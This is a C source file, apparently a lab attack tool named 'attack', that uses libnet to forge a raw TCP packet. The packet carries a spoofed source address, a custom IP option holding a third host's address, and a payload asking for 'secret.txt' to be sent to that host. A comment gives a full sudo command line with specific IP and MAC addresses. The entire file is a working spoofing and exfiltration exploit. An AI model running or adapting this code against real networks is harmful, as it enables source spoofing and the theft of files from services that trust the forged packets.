#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <sys/types.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/ethernet.h>


int main(int argc, char* argv[])
{
  libnet_t *context;
  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_ptag_t t;
  char * device = "eth0";
  u_int16_t sport = 1929;
  u_int16_t dport = 3333;
  u_int32_t seq, ack;
  u_int32_t saddr = 0;
  u_int32_t daddr = 0;
  u_int32_t taddr = 0;
  char c;
  extern char *optarg;
  extern int optind, optopt;
  struct timeval tp;
  u_int8_t buf[8];
  int res;
  u_int8_t eth_daddr[6];
  u_int8_t eth_saddr[6];
  char *payload = "128.111.48.59:secret.txt";

  while ((c = getopt(argc, argv, "i:s:d:f:t:k:x:y:p:")) != -1) {
    switch (c) {
    case 'i':
      device = optarg;
      break;
    case 's':
      sport = atoi(optarg);
      break;
    case 'd':
      dport = atoi(optarg);
      break;
    case 'f':
      saddr = inet_addr(optarg);
      break;
    case 't':
      daddr = inet_addr(optarg);
      break;
    case 'k':
      taddr = inet_addr(optarg);
      break;
    case 'x':
      memcpy(eth_saddr, (u_char *)ether_aton(optarg), 6);
      break;
    case 'y':
      memcpy(eth_daddr, (u_char *)ether_aton(optarg), 6);
      break;
    case 'p':
      payload = optarg;
      break;
    }
  }
  // sudo ./attack -i en0 -f 128.111.54.45 -t 128.111.48.77 -k 128.111.48.59 -x 00:0c:29:7f:7b:21 -y 00:0c:29:7f:7b:23 -p 128.111.48.59:secret.txt
  if (gettimeofday(&tp, NULL) != 0) {
    fprintf(stderr, "cannot determine time");
    return 1;
  }

  seq = 12345678;
  ack = tp.tv_sec + sport;
  
  /* Initializes the libnet context */
  context = libnet_init(LIBNET_LINK, device, errbuf);

  if (context == NULL) {
    fprintf(stderr, "cannot initialize packet generation routines: %s", errbuf);
    return 1;
  }
  
  /* Send the ACK */
  t = libnet_build_tcp(sport,
		       dport,
		       seq,
		       ack,
		       TH_ACK,
		       512,
		       0, /* Checksum */
		       0,
		       20 + strlen(payload), 
		       (u_char *)payload, /* Payload */
		       strlen(payload), /* Payload length */
		       context,
		       0);
  if (t == -1) {
    fprintf(stderr, "can't build TCP header: %s", libnet_geterror(context));
    return 1;
  }

  /* First four bytes of option */
  buf[0] = 28;
  buf[1] = 8;
  buf[2] = 0;
  buf[3] = 0;
  buf[4] = ((u_int8_t *)&taddr)[0];
  buf[5] = ((u_int8_t *)&taddr)[1];;
  buf[6] = ((u_int8_t *)&taddr)[2];
  buf[7] = ((u_int8_t *)&taddr)[3];
  int opt_len = 8;

  t = libnet_build_ipv4_options(buf, opt_len, context, 0);
  if (t == -1) {
    fprintf(stderr, "can't build ip options: %s\n", libnet_geterror(context));
    return 1;
  }
  
  t = libnet_build_ipv4(40 + strlen(payload) + opt_len,
			0,
			12345,
			0,
			64,
			IPPROTO_TCP,
			0, /* Checksum */
			saddr,
			daddr,
			NULL, /* Payload */
			0, /* Payload length */
			context,
			0);
  if (t == -1) {
    fprintf(stderr, "can't build ip header: %s", libnet_geterror(context));
    return 1;
  }

  t = libnet_build_ethernet(eth_daddr, /* Ethernet destination */
			    eth_saddr, /* Ethernet source */
			    ETHERTYPE_IP, /* Protocol type */
			    NULL, /* Payload */
			    0, /* Payload size */
			    context, /* Libnet context */
			    0); /* Protocol tag */
  if (t == -1) {
    fprintf(stderr, "Can't build ethernet header: %s", libnet_geterror(context));
    return 1;
  }
	
  res = libnet_write(context);
	
  if (res == -1) {
    fprintf(stderr, "libnet write error: %s", libnet_geterror(context));
    return 1;
  }
  return 0;
}
